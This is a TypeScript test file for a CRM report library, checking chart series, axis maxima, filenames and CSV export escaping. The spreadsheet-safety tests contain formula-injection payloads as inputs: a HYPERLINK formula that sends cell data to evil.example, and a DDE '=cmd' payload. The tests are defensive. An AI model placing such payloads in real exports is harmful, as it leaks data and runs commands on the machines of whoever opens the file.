import { test } from "node:test";
import assert from "node:assert/strict";
import {
	REPORT_LIBRARY,
	csatDistributionRows,
	csvField,
	exportFilename,
	findReport,
	niceMax,
	toCsv,
	toSeries,
} from "../src/crm/report-library.ts";

/* ----------------------------------------------------------------- library */

test("every report has a unique id and a chart decision", () => {
	const ids = REPORT_LIBRARY.map((r) => r.id);
	assert.equal(new Set(ids).size, ids.length);
	for (const r of REPORT_LIBRARY) {
		assert.ok(
			r.title && r.description,
			`${r.id} needs a title and description`,
		);
		assert.ok(r.columns.length > 0, `${r.id} needs columns`);
		assert.ok(["column", "small_multiples", "none"].includes(r.chart));
	}
});

test("findReport returns undefined rather than guessing", () => {
	assert.equal(findReport("volume_by_day")?.group, "day");
	assert.equal(findReport("no_such_report"), undefined);
});

/* ------------------------------------------------------------------ series */

test("day order is preserved, because the order is the x-axis", () => {
	const rows = [
		{ day: "2026-09-03", regionId: "uae", conversations: 2 },
		{ day: "2026-09-01", regionId: "uae", conversations: 9 },
		{ day: "2026-09-02", regionId: "uae", conversations: 5 },
	];
	const series = toSeries(rows, "day", "conversations", "regionId");
	assert.deepEqual(
		series[0]!.points.map((p) => p.label),
		["2026-09-03", "2026-09-01", "2026-09-02"],
		"not re-sorted by value, which would turn a trend into a ranking",
	);
});

test("a panel key splits the series; without one there is a single panel", () => {
	const rows = [
		{ day: "d1", regionId: "uae", n: 1 },
		{ day: "d1", regionId: "ksa", n: 2 },
		{ day: "d2", regionId: "uae", n: 3 },
	];
	const split = toSeries(rows, "day", "n", "regionId");
	assert.deepEqual(
		split.map((s) => s.name),
		["uae", "ksa"],
	);
	assert.equal(split[0]!.points.length, 2);

	const single = toSeries(rows, "day", "n");
	assert.equal(single.length, 1);
	assert.equal(single[0]!.points.length, 3);
});

test("a non-numeric or missing value becomes zero, not NaN", () => {
	const rows = [
		{ day: "d1", n: "lots" },
		{ day: "d2" },
		{ day: "d3", n: Number.NaN },
		{ day: "d4", n: 4 },
	];
	assert.deepEqual(
		toSeries(rows, "day", "n")[0]!.points.map((p) => p.value),
		[0, 0, 0, 4],
	);
});

/* ------------------------------------------------------------------ axis */

test("niceMax lands on a round number at or above the peak", () => {
	assert.equal(niceMax([3, 7, 9]), 10);
	assert.equal(niceMax([12, 4]), 20);
	assert.equal(niceMax([120]), 200);
	assert.equal(niceMax([21]), 25);
	assert.equal(niceMax([1]), 1);
});

test("an all-zero series still gets a drawable axis", () => {
	assert.equal(niceMax([0, 0, 0]), 1, "never 0 — the scale would divide by it");
	assert.equal(niceMax([]), 1);
	assert.equal(niceMax([-5]), 1);
});

/* ------------------------------------------------- CSV: spreadsheet safety */

test("a field that a spreadsheet would run as a formula is defused", () => {
	// The attack: this opens in Excel as a live formula, not as a name.
	assert.equal(csvField("=1+1"), "'=1+1");
	assert.equal(
		csvField('=HYPERLINK("http://evil.example/?s="&A1,"Click")'),
		`"'=HYPERLINK(""http://evil.example/?s=""&A1,""Click"")"`,
	);
	assert.equal(csvField("+44 7388 800000"), "'+44 7388 800000");
	assert.equal(csvField("@someone"), "'@someone");
	assert.equal(csvField("-ABC-UAE-088210"), "'-ABC-UAE-088210");
	assert.equal(csvField("\tTabbed"), "'\tTabbed");
});

test("an ordinary value is not mangled by the guard", () => {
	assert.equal(csvField("Rashid Al Marzooqi"), "Rashid Al Marzooqi");
	assert.equal(csvField("ABC-UAE-088210"), "ABC-UAE-088210");
	assert.equal(csvField(42), "42");
	assert.equal(csvField(0), "0");
	assert.equal(csvField("+971800916".slice(1)), "971800916");
});

test("quotes, commas, semicolons and newlines are quoted and doubled", () => {
	assert.equal(csvField('He said "late"'), '"He said ""late"""');
	assert.equal(csvField("Dubai, UAE"), '"Dubai, UAE"');
	assert.equal(
		csvField("a;b"),
		'"a;b"',
		"semicolon: Excel in a European locale",
	);
	assert.equal(csvField("line1\nline2"), '"line1\nline2"');
	assert.equal(csvField("cr\rlf"), '"cr\rlf"');
});

test("empty, null, undefined and non-finite all become an empty field", () => {
	assert.equal(csvField(null), "");
	assert.equal(csvField(undefined), "");
	assert.equal(csvField(""), "");
	assert.equal(csvField(Number.NaN), "");
	assert.equal(csvField(Number.POSITIVE_INFINITY), "");
});

/* ------------------------------------------------------------------- toCsv */

test("the CSV carries the definition's columns, in order, with a BOM", () => {
	const def = findReport("csat_distribution")!;
	const csv = toCsv(
		def,
		csatDistributionRows({ 1: 0, 2: 1, 3: 2, 4: 8, 5: 9 }),
	);
	assert.ok(csv.startsWith("﻿"), "BOM, or Excel mangles Arabic names");
	const lines = csv.slice(1).split("\r\n");
	assert.equal(lines[0], "Score,Responses");
	assert.equal(lines[1], "1,0");
	assert.equal(lines[5], "5,9");
	assert.equal(lines.length, 6);
});

test("CRLF endings, and the BOM can be turned off", () => {
	const def = findReport("csat_distribution")!;
	const csv = toCsv(def, [{ score: "5", responses: 1 }], { bom: false });
	assert.ok(!csv.startsWith("﻿"));
	assert.ok(csv.includes("\r\n"));
});

test("a column the rows do not have exports as empty, not as 'undefined'", () => {
	const def = findReport("tickets_by_type")!;
	const csv = toCsv(def, [{ type: "claim", opened: 3 }], { bom: false });
	assert.equal(csv.split("\r\n")[1], "claim,3,,");
});

test("a malicious customer name cannot reach a spreadsheet as a formula", () => {
	const def = {
		id: "x",
		title: "x",
		description: "x",
		group: "region" as const,
		columns: [{ key: "name", label: "Customer" }],
		chart: "none" as const,
		supervisorOnly: true,
	};
	const csv = toCsv(def, [{ name: "=cmd|'/c calc'!A1" }], { bom: false });
	assert.ok(csv.includes("'=cmd"), csv);
	assert.ok(!/(^|,)=cmd/m.test(csv), "no field starts with a bare =");
});

/* ---------------------------------------------------------------- filename */

test("the export filename is legal on Windows", () => {
	const def = findReport("volume_by_day")!;
	const name = exportFilename(def, {
		from: "2026-09-01T00:00:00.000Z",
		to: "2026-09-14T23:59:59.000Z",
	});
	assert.equal(name, "abc-cargo-volume_by_day-2026-09-01-to-2026-09-14.csv");
	assert.ok(!/[:<>"|?*]/.test(name), "a colon alone breaks the download");
});

test("a missing window still produces a usable filename", () => {
	const def = findReport("volume_by_day")!;
	assert.equal(
		exportFilename(def, { from: "", to: "" }),
		"abc-cargo-volume_by_day-unknown-to-unknown.csv",
	);
});

/* ------------------------------------------------------------ distribution */

test("all five scores are present even when nobody gave one", () => {
	const rows = csatDistributionRows({ 4: 2, 5: 3 });
	assert.deepEqual(
		rows.map((r) => r.responses),
		[0, 0, 0, 2, 3],
		"a missing 2 would read as though 2 were impossible",
	);
});
